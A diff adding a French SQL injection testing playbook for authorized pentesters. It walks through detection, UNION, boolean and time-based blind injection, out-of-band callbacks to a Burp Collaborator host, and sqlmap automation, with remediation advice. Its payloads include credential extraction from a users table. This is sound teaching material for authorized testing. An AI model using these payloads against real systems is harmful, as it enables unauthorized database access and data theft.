@@ -1,0 +1,250 @@
+````markdown
+# 🚀 SQL Injection Playbook — Workflow Professionnel
+
+> ⚠️ **À utiliser uniquement avec autorisation écrite** (périmètre défini & consenti).  
+> Références : [**PortSwigger Web Security Academy**][1] (détection, UNION, blind, OAST) et [**OWASP WSTG**][2] (méthodologie de test).
+
+---
+
+## 🔧 0) Préparation
+
+- **Proxy & outils** : Burp Suite (Logger++, Repeater, Intruder), `ffuf`, `feroxbuster`, `sqlmap`.
+- **Cartographie** : endpoints & paramètres (GET, POST, JSON, headers/cookies).
+- **Règle d’or** : privilégier des payloads **non destructifs** ✅.
+
+---
+
+## 🕵️ 1) Détection rapide (in-band vs blind)
+
+### 🔹 1.1 Sonde minimale
+
+Injecter `'` ou `"` et observer :
+
+```diff
++ Erreur SQL visible → SQLi in-band probable (error/UNION).
+! Pas d’erreur mais contenu différent → Blind boolean.
+- Aucun écart → tester Time-based ou OAST.
+````
+
+*(cf. [PortSwigger Blind SQLi][3])*
+
+### 🔹 1.2 Commentaires & fermetures (selon SGBD)
+
+* **MySQL** : `-- ` (avec espace), `#`, `/* … */`
+* **PostgreSQL / SQL Server / Oracle** : `--`, `/* … */`
+
+---
+
+## 🎯 2) SQLi in-band (Error-based & UNION)
+
+### 2.1 Error-based
+
+Exemples d’empreintes (fingerprinting) :
+
+```sql
+-- MySQL
+?id=1 AND @@version--
+
+-- PostgreSQL
+?id=1 UNION SELECT current_database()--
+
+-- SQL Server
+?id=1 UNION SELECT @@version--
+
+-- Oracle
+?id=1 UNION SELECT banner FROM v$version--
+```
+
+> 💡 Si aucune erreur affichée → passer à **UNION** ou **blind**.
+
+---
+
+### 2.2 UNION query — procédure canonique
+
+**1. Trouver nb colonnes**
+
+```sql
+?id=1 ORDER BY 1--
+?id=1 ORDER BY 2--
+...
+```
+
+ou
+
+```sql
+?id=1 UNION SELECT NULL--
+?id=1 UNION SELECT NULL,NULL--
+```
+
+**2. Colonnes affichées (texte)**
+
+```sql
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+```
+
+**3. Enumérer**
+
+* Version : `version()`, `@@version`, `current_database()`, `banner ...`
+* Tables : `information_schema.tables` ou vues Oracle (`all_tables`)
+* Colonnes : `information_schema.columns`
+* Données : `UNION SELECT username,password FROM users--`
+
+✅ **Checklist In-band**
+
+* [ ] Nb colonnes trouvé
+* [ ] Colonne(s) texte identifiée(s)
+* [ ] Version & DB courante extraite
+* [ ] Tables/colonnes listées
+* [ ] PoC avec données non sensibles
+
+---
+
+## 🕳️ 3) SQLi Blind (aucune sortie exploitable)
+
+> **Stratégie** : ① Boolean-based (réponse change) → ② Time-based (latence) → ③ OAST (DNS/HTTP externe).
+> (cf. [PortSwigger Blind SQLi][3])
+
+---
+
+### 3.1 Boolean-based
+
+```sql
+?id=1 AND 1=1--
+?id=1 AND 1=2--
+```
+
+Exfiltration caractère par caractère (MySQL exemple) :
+
+```sql
+?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>77--
+```
+
+---
+
+### 3.2 Time-based
+
+Utiliser fonctions de délai pour tester vrai/faux :
+
+```sql
+-- MySQL
+?id=1 AND IF(ASCII(SUBSTRING(version(),1,1))>77,SLEEP(5),0)--
+
+-- PostgreSQL
+?id=1 AND CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>77) THEN pg_sleep(5) ELSE '' END--
+
+-- SQL Server
+?id=1 AND IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77, WAITFOR DELAY '0:0:5',0)--
+
+-- Oracle
+?id=1 AND CASE WHEN ASCII(SUBSTR((SELECT ora_database_name FROM dual),1,1))>77 THEN dbms_pipe.receive_message('a',5) END--
+```
+
+---
+
+### 3.3 Out-of-Band (OAST)
+
+Déclencher une requête externe (Burp Collaborator, DNS/HTTP) :
+
+```sql
+-- SQL Server
+; EXEC master..xp_dirtree '\\<collab-id>\a'--
+
+-- Oracle
+UTL_HTTP.REQUEST('http://<collab-id>')
+
+-- MySQL (Windows)
+LOAD_FILE('\\\\<collab-id>\\a')
+```
+
+✅ **Checklist Blind**
+
+* [ ] Point d’injection confirmé
+* [ ] Méthode choisie (Boolean / Time / OAST)
+* [ ] Extraction version/DB validée
+* [ ] Script d’automatisation prêt
+
+---
+
+## 🌳 4) Arbre de décision (résumé)
+
+```diff
+? Erreur SQL visible ?
++ Oui → Error/UNION → Nb colonnes → Enumération
+! Non → Contenu change ?
++ Oui → Blind Boolean (dichotomie)
+! Non → Latence mesurable ?
++ Oui → Blind Time (SLEEP / WAITFOR / pg_sleep)
+- Non → OAST (Burp Collaborator / DNS)
+```
+
+---
+
+## 📊 5) Payloads de base par SGBD
+
+| Objectif    | MySQL        | PostgreSQL           | SQL Server              | Oracle                        |
+| ----------- | ------------ | -------------------- | ----------------------- | ----------------------------- |
+| Version     | `version()`  | `version()`          | `@@version`             | `banner FROM v$version`       |
+| DB courante | `database()` | `current_database()` | `DB_NAME()`             | `ora_database_name FROM dual` |
+| Time delay  | `SLEEP(5)`   | `pg_sleep(5)`        | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message`   |
+
+---
+
+## 🤖 6) Automatisation avec sqlmap
+
+```bash
+sqlmap -u "https://target/item.php?id=1" -p id \
+  --risk=2 --level=2 \
+  --technique=BEUSTQ \
+  --fingerprint
+```
+
+* `--technique=BEUSTQ` : Boolean, Error, UNION, Stacked, Time, Query inline
+* `--fingerprint` : identification du SGBD/version
+
+> 💡 Astuce pro : commence **manuel** (comprendre l’injection), puis utilise **sqlmap** pour automatiser l’énumération.
+
+---
+
+## 📝 7) Qualité du rapport
+
+* **Reproduction** : payload exact + captures Burp.
+* **Impact** : quelles données accessibles ? périmètre ? pivot possible.
+* **Remédiations** :
+
+  * Requêtes paramétrées / ORM
+  * Principes **Least Privilege**
+  * Masquage d’erreurs
+  * WAF en défense complémentaire
+
+---
+
+## ✅ 8) Check-list finale “Prête à l’emploi”
+
+* [ ] Cartographie params (GET, POST, cookies, JSON body)
+* [ ] Tests `'` + commentaires
+* [ ] In-band : ORDER BY / UNION NULL → nb colonnes → colonne affichée
+* [ ] Blind : boolean → time → OAST
+* [ ] Fingerprint SGBD + version
+* [ ] PoC non destructif + preuves
+* [ ] Rapport clair + remédiations
+
+---
+
+### 📚 Annexes
+
+* [PortSwigger SQLi Labs][1]
+* [OWASP WSTG SQLi Testing][2]
+
+---
+
+[1]: https://portswigger.net/web-security/sql-injection
+[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+[3]: https://portswigger.net/web-security/sql-injection/blind
+
+```
+
+---
+
+```
